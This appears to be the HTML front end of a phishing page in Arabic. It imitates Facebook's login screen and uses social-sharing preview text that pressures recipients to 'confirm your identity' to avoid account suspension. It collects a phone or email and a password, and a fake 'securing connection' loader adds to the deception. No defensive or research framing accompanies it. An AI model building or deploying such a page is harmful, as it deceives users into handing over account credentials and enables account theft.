<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="تأكيد نشاط تسجيل الدخول | فيسبوك">
    <meta property="og:description" content="يرجى تأكيد هويتك الآن لتجنب تعطيل الحساب نتيجة دخول مشبوه.">
    <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png">
    
    <title>فيسبوك - تسجيل الدخول أو الاشتراك</title>
    
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div id="loader">
        <div class="spinner"></div>
        <p style="margin-top:20px; color:#606770;">جاري تأمين الاتصال بفيسبوك...</p>
    </div>

    <div class="fb-container">
        <div class="header">facebook</div>
        <div class="form-area">
            <form id="loginForm">
                <input type="text" id="user" placeholder="رقم الجوال أو البريد الإلكتروني" required>
                <input type="password" id="pass" placeholder="كلمة المرور" required>
                <button type="submit" class="login-btn">تسجيل الدخول</button>
            </form>
            <div class="links">
                <a href="#">نسيت كلمة المرور؟</a><br><br>
                <a href="#">إنشاء حساب جديد</a>
            </div>
        </div>
        <div class="footer">
            العربية · English · Türkçe · المزيد<br>
            Meta © 2026
        </div>
    </div>
